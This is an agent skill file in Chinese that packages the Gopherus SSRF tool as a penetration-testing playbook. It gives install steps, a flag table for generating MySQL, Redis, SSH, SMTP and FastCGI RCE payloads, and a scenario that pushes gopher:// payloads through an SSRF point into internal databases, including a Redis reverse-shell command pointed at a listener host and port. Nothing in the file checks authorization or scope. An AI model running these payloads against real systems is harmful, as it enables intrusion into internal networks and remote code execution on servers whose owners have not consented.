---
name: gopherus-ssrf
description: 渗透工具 skill:Gopherus 的安装、参数速查与攻击场景 playbook。当任务涉及 Web应用漏洞利用 需要调用 Gopherus 时使用。
when-to-use: 渗透工具 skill:Gopherus 的安装、参数速查与攻击场景 playbook。当任务涉及 Web应用漏洞利用 需要调用 Gopherus 时使用。
---

# Gopherus

- 攻击大类:C09 Web应用漏洞利用
- 上游仓库:https://github.com/tarunkant/Gopherus
- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/tarunkant/Gopherus && cd Gopherus
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python gopherus.py --exploit mysql` | 生成 MySQL 攻击载荷 |
| `--exploit redis` | Redis 载荷 |
| `--exploit ssh` | SSH 载荷 |
| `--exploit smtp` | SMTP 发信 |
| `--exploit rce` | FastCGI RCE |

## 攻击场景 Playbook

### SSRF 打内网 MySQL/Redis

```bash
python gopherus.py --exploit mysql  # 填 root 密码与查询语句
# 输出 gopher:// 编码载荷,塞进 SSRF 点 → 内网数据库执行
python gopherus.py --exploit redis --lhost 10.8.0.2 --lport 4444  # 反弹载荷
```

## 注意事项

生成 gopher:// 协议载荷把 SSRF 升级为内网协议攻击;覆盖 MySQL/Redis/FastCGI/SMTP/SMB 等。
